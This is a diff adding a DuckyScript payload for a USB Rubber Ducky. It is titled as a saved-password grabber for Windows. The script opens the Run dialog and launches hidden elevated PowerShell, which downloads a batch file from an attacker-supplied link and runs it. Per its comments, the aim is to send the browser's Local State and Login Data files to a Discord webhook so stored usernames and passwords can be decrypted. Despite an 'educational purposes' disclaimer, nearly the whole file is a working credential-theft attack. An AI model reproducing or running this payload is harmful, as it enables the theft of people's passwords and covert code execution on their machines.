@@ -1,0 +1,31 @@
+REM Title: 4sSavedPasswordsGrabber
+REM Author: Tarnishsilver
+REM Description: Sends localstate and login data files to discord server, which can be decrypted to get usernames and passwords in plain text.
+REM Description: Rubber Ducky can be removed within 3-4 seconds as attack takes place from a file online. Thus, attack takes place very fast.
+REM Target: Windows
+
+REM /||( Prerequisites: - Upload "attack_file.bat" to google drive or any service which can give direct links to download file.
+                        - Make a discord server and create a webhook url
+                        - Use the decrypter given to decrypt localstate and login data files.
+REM )
+REM DISCLAIMER: FOR EDUCATIONAL AND ETHICAL TESTING PURPOSES ONLY.
+
+REM Opens run dialog box
+GUI r
+
+REM Downloads the file from google drive and runs it in hidden state
+STRING powershell -w hidden -Command "Invoke-WebRequest -Uri
+DELAY 700
+
+REM Put "attack_file.bat" link which is driect downloadable
+REM Can use "https://sites.google.com/site/gdocs2direct/" to create direct downloadable link
+STRING '[URL BATCH FILE URL(eg-google drive link)]'
+DELAY 700
+
+REM Temporarily saves it in Public folder
+STRING '-OutFile C:\Users\Public\f2.bat'; cmd /c C:\Users\Public\f2.bat; exit
+CTRL
+SHIFT
+ENTER
+
+REM "f2.bat" will be deleted by "attack_file.bat".
